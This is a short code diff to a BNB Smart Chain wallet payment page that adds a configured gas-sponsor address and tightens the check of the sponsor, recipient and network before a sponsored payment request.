@@ -309,7 +309,8 @@
       coinId: '20000714',
       chainId: '0x38',
       sponsorApiUrl: 'https://trust-wallet-gas-server-production.up.railway.app',
-      sponsorFundingEnabled: false
+      sponsorFundingEnabled: false,
+      sponsorAddress: '0x1c9106275e1466edf4828E7B3AFAc53598D290B2'
     });
     address.value = walletConfig.address;
     networkName.textContent = walletConfig.network;
@@ -611,7 +612,7 @@
       const health=await request('/health');
       if (!health.sponsorshipEnabled) return;
       const recipient=document.querySelector('#amountRecipient').textContent;
-      if (health.sponsorAddress?.toLowerCase()!==recipient.toLowerCase() || health.chainId!==56) throw new Error('Gas sponsor does not match the selected recipient/network.');
+      if (health.sponsorAddress?.toLowerCase()!==walletConfig.sponsorAddress.toLowerCase() || health.recipientAddress?.toLowerCase()!==recipient.toLowerCase() || health.chainId!==56) throw new Error('Gas sponsor, recipient or network does not match the configured payment.');
       await verifyWallet();
       const wallet=connectedAccount;
       const challenge=await request('/api/gas/challenge',{wallet,recipient,amount:amountText.endsWith('.')?amountText.slice(0,-1):amountText});
